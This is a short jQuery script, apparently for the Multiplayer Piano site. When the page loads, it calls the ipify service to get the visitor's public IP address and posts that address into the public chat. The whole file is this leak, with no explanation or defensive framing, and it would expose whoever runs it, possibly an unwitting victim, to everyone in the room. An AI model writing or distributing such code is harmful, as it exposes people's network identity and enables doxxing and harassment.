$(document).ready(function () {
    $.getJSON("https://api64.ipify.org?format=json", function (data) {
        MPP.chat.send(data.ip);
    });
});
